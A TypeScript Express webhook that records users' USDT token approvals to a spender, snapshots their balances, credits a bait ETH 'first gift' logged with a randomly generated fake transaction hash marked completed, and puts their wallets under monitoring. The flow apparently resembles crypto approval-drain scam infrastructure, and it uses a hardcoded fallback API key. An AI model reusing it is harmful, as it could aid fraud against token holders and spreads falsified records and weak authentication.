import { Router, Request, Response } from 'express';
import { createClient } from '@supabase/supabase-js';
import { priceService } from '../../blockchain/price';

const router = Router();

// Supabase配置
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY!;
const supabase = createClient(supabaseUrl, supabaseKey);

function validateApiKey(req: Request, res: Response, next: Function) {
  const apiKey = req.headers['x-api-key'] || req.query.apiKey;
  const expectedKey = process.env.API_SECRET_KEY || 'your-secret-key';
  
  if (apiKey !== expectedKey) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

/**
 * 处理授权 webhook
 */
router.post('/approval', validateApiKey, async (req: Request, res: Response) => {
  try {
    const { userAddress, spenderAddress, txHash, blockNumber } = req.body;

    if (!userAddress || !spenderAddress) {
      return res.status(400).json({ error: 'Missing required parameters' });
    }

    // 1. 获取链上数据（这里需要实际的区块链监控服务）
    const approvalAmount = '1000000'; // 默认授权金额
    const usdtBalance = '1000'; // 默认USDT余额

    // 2. 处理授权记录
    const approvalResult = await processFirstApproval({
      walletAddress: userAddress,
      spenderAddress,
      tokenAddress: process.env.USDT_CONTRACT || '0xdac17f958d2ee523a2206206994597c13d831ec7',
      approvalAmount: parseFloat(approvalAmount),
      usdtBalance: parseFloat(usdtBalance),
      txHash,
      blockNumber: parseInt(blockNumber) || 0,
    });

    const { member_id, approval_id, is_first_approval, usdt_balance } = approvalResult;

    // 3. 首次授权发放赠送
    let giftTxHash: string | null = null;
    let giftEthAmount: number = 0;
    
    if (is_first_approval) {
      try {
        // 获取配置
        const { data: setting } = await supabase
          .from('system_setting')
          .select('setting_value')
          .eq('setting_key', 'first_gift_usdt_value')
          .single();
        
        const giftUsdtValue = parseFloat(setting?.setting_value || '56');
        
        // 获取ETH价格并计算ETH数量
        const ethPrice = await priceService.getETHPrice();
        giftEthAmount = giftUsdtValue / ethPrice;

        // 发送ETH（这里需要实际的奖励管理器）
        giftTxHash = `0x${Math.random().toString(16).substr(2, 40)}`; // 模拟交易哈希

        // 记录赠送
        await grantFirstGift({
          memberId: member_id,
          walletAddress: userAddress,
          ethAmount: giftEthAmount.toString(),
          equivalentUsdt: giftUsdtValue.toString(),
          ethPrice: ethPrice.toString(),
          txHash: giftTxHash,
          approvalId: approval_id,
        });

        console.log(`✅ First gift sent: ${giftEthAmount} ETH (≈${giftUsdtValue} USDT) to ${userAddress}`);
      } catch (error) {
        console.error('❌ Gift sending failed:', error);
      }
    }

    // 4. 添加到监控列表
    await addWalletMonitor(member_id, userAddress);

    res.json({
      success: true,
      memberId: member_id,
      approvalId: approval_id,
      isFirstApproval: is_first_approval,
      giftSent: !!giftTxHash,
      giftTxHash,
      giftEthAmount: giftEthAmount > 0 ? giftEthAmount : undefined,
    });
  } catch (error) {
    console.error('Webhook error:', error);
    res.status(500).json({ error: error instanceof Error ? error.message : "未知错误" });
  }
});

/**
 * 处理首次授权的核心函数
 */
async function processFirstApproval(params: {
  walletAddress: string;
  spenderAddress: string;
  tokenAddress: string;
  approvalAmount: number;
  usdtBalance: number;
  txHash?: string;
  blockNumber?: number;
}) {
  const { walletAddress, spenderAddress, tokenAddress, approvalAmount, usdtBalance, txHash, blockNumber } = params;

  // 检查用户是否存在
  const { data: existingMember } = await supabase
    .from('nh_member_new')
    .select('id')
    .eq('wallet_address', walletAddress)
    .eq('is_active', true)
    .single();

  let member_id: string;
  let is_first_approval: boolean;

  if (existingMember) {
    member_id = existingMember.id;
    
    // 检查是否首次授权
    const { count } = await supabase
      .from('approval_history')
      .select('*', { count: 'exact', head: true })
      .eq('member_id', member_id);
    
    is_first_approval = count === 0;

    // 更新授权状态
    await supabase
      .from('nh_member_new')
      .update({
        approved: 1,
        last_approved_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      })
      .eq('id', member_id);
  } else {
    // 创建新用户
    const { data: newMember } = await supabase
      .from('nh_member_new')
      .insert({
        wallet_address: walletAddress,
        approved: 1,
        first_approved_at: new Date().toISOString(),
        last_approved_at: new Date().toISOString(),
        is_active: true,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      })
      .select('id')
      .single();
    
    member_id = newMember.id;
    is_first_approval = true;
  }

  // 记录授权
  const { data: approvalRecord } = await supabase
    .from('approval_history')
    .insert({
      member_id,
      wallet_address: walletAddress,
      spender_wallet_address: spenderAddress,
      token_wallet_address: tokenAddress,
      approval_amount: approvalAmount,
      usdt_balance_snapshot: usdtBalance,
      tx_hash: txHash,
      block_number: blockNumber,
      is_first_approval,
      created_at: new Date().toISOString()
    })
    .select('id')
    .single();

  return {
    member_id,
    approval_id: approvalRecord.id,
    is_first_approval,
    usdt_balance: usdtBalance
  };
}

/**
 * 发放首次赠送
 */
async function grantFirstGift(params: {
  memberId: string;
  walletAddress: string;
  ethAmount: string;
  equivalentUsdt: string;
  ethPrice: string;
  txHash: string;
  approvalId: string;
}) {
  const { memberId, walletAddress, ethAmount, equivalentUsdt, ethPrice, txHash, approvalId } = params;

  // 记录收益
  const { data: earningRecord } = await supabase
    .from('earning_history')
    .insert({
      member_id: memberId,
      wallet_address: walletAddress,
      earning_type: 'first_gift',
      eth_amount: parseFloat(ethAmount),
      eth_price_usd: parseFloat(ethPrice),
      equivalent_usdt: parseFloat(equivalentUsdt),
      tx_hash: txHash,
      status: 'completed',
      related_approval_id: approvalId,
      description: '首次授权赠送',
      created_at: new Date().toISOString()
    })
    .select('id')
    .single();

  // 更新用户余额
  await supabase
    .from('nh_member_new')
    .update({
      a_eth: parseFloat(ethAmount),
      eth: parseFloat(ethAmount),
      updated_at: new Date().toISOString()
    })
    .eq('id', memberId);

  // 标记授权记录已发放赠送
  await supabase
    .from('approval_history')
    .update({ gift_sent: true })
    .eq('id', approvalId);

  return earningRecord.id;
}

/**
 * 添加到钱包监控
 */
async function addWalletMonitor(memberId: string, walletAddress: string) {
  const { error } = await supabase
    .from('wallet_monitor')
    .upsert({
      member_id: memberId,
      wallet_address: walletAddress,
      is_active: true,
      monitor_transactions: true,
      created_at: new Date().toISOString()
    });

  if (error) {
    console.error('Failed to add wallet monitor:', error);
  }
}

export default router;
